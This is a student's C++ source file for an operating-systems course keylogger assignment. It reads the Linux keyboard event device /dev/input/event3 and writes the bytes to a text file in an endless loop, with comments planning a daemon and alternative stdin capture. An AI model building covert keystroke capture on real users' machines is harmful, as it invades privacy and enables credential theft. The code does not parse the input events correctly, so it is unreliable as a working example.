// Operating Systems - CS444
// Spring 2023
// Sophia Carlone
// Keylogger Assignment
// Description
// Date
// Video link

/*
1. creating a deamon process in c/c++
2. keylogging to a string
2 ways:
    A. Reading keyboard events. On linux, reading them from /dev/input/eventX. (ie. event0)
find correct index. root privilage?
    B. Taking user input directly from stdin. (getchar(), etc.)
3. writing the string in step 2 to a file.


*/

//My computer has keyboard on event 3

#include <iostream>
#include <fstream>
#include <linux/input.h> //for input event
// #include <filesystem> //new library to learn about

using namespace std;
// using namespace std::filesystem;

int main(){
    ofstream out;
    string filename = "keys_logged.txt";
    string keyboard_device = "/dev/input/event3";
    ifstream in;

    //this is the file that is logging all the characters. Does it need more information?
    in.open(keyboard_device);
    out.open(filename);

    /*dont need to use threads because people can really only really give one keyboard input at a time
    *even if you try to press at the same time there is a slight difference. */

    char c; //character (do it one at a time or can I do something more efficient)


    while(true){
        in >> c;
        out << c;
   }
}



//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


    //     //getting keys
    //     c = getchar();
    //     out << c;
    //     if( c == '}') break;
 